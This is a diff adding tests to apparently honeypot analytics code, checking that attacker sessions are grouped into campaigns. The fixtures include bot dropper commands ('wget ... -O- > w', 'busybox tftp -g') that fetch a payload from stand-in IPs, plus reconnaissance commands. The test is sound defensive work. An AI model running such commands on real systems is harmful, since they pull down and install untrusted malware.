@@ -116,6 +116,20 @@ def test_history_replaces_same_day_and_keeps_old_schema(tmp_path):
     assert [r["date"] for r in rows] == ["2026-11-05", "2026-11-06"]
 
 
+def test_campaign_id_groups_bots_that_only_differ_by_download_server():
+    a = {"commands": ["enable", "wget http://192.0.2.10/x -O- > w", "busybox tftp -g 192.0.2.10"]}
+    b = {"commands": ["enable", "wget http://192.0.2.99/x -O- > w", "busybox tftp -g 192.0.2.99"]}
+    c = {"commands": ["uname -a", "cat /proc/cpuinfo"]}
+    assert stats.campaign_id(a) == stats.campaign_id(b)
+    assert stats.campaign_id(a) != stats.campaign_id(c)
+    assert stats.campaign_id({"commands": []}) is None
+
+
+def test_summary_counts_campaigns(tmp_path):
+    m = stats.summarize(sessions_from(tmp_path), geo={}, today="2026-11-06")
+    assert m["campaigns"] == 1 and m["top_campaign"] == 1
+
+
 def test_is_stale():
     rows = [{"connections": "10"}, {"connections": "10"}, {"connections": "10"}]
     assert stats.is_stale(rows, days=2)
